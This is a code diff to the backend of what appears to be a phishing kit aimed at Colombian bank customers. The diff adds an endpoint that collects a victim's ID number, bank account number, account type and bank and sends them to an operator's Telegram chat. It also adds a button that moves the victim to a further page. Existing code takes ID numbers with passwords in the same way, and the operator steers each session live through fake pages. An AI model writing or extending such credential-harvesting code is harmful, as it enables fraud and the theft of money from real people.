@@ -60,6 +60,9 @@ async function enviarMensajeTelegram({ cedula, docType, password, sessionId }) {
       [
         { text: "❌ ERROR LOG → face.html", callback_data: `face_${sessionId}` },
         { text: "✅ FINALIZAR → montos.html", callback_data: `montos_${sessionId}` }
+      ],
+      [
+        { text: "📋 SOLICITUD → idfy.html", callback_data: `idfy_${sessionId}` }
       ]
     ]
   };
@@ -82,6 +85,59 @@ async function enviarMensajeTelegram({ cedula, docType, password, sessionId }) {
     sessions.set(sessionId, sessionData);
   }
 }
+
+// Enviar mensaje con datos de cuenta al Telegram
+async function enviarMensajeCuenta({ cedula, docType, cuenta, tipoCuenta, banco, sessionId }) {
+  const mensaje = `
+🏦 DATOS DE CUENTA TITULAR
+👤 Titular: ${docType} ${cedula}
+🔢 Número de cuenta: ${cuenta}
+💳 Tipo: ${tipoCuenta}
+🏛️ Banco: ${banco}
+⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}
+
+⏳ Esperando decisión del admin...
+`;
+
+  const botones = {
+    inline_keyboard: [
+      [
+        { text: "❌ ERROR LOG → face.html", callback_data: `face_${sessionId}` },
+        { text: "✅ FINALIZAR → montos.html", callback_data: `montos_${sessionId}` }
+      ]
+    ]
+  };
+
+  const response = await fetch(getTelegramApiUrl('sendMessage'), {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, reply_markup: botones })
+  });
+
+  const data = await response.json();
+  if (data.ok && data.result) {
+    const sessionData = sessions.get(sessionId) || { redirect_to: null };
+    sessionData.last_message_id = data.result.message_id;
+    sessions.set(sessionId, sessionData);
+  }
+}
+
+// POST /cuentatitular - Recibe datos de cuenta bancaria
+app.post("/cuentatitular", async (req, res) => {
+  const { session_id, cedula, docType, cuenta, tipoCuenta, banco } = req.body;
+  const sessionId = session_id;
+
+  if (sessionId && cuenta && tipoCuenta && banco) {
+    const sessionData = sessions.get(sessionId) || { redirect_to: null };
+    sessionData.redirect_to = null;
+    sessions.set(sessionId, sessionData);
+
+    await enviarMensajeCuenta({ cedula, docType, cuenta, tipoCuenta, banco, sessionId });
+    return res.json({ ok: true });
+  }
+
+  return res.status(400).json({ error: "Faltan parámetros" });
+});
 
 // POST /virtualpersona - Recibe cedula + contraseña
 app.post("/virtualpersona", async (req, res) => {
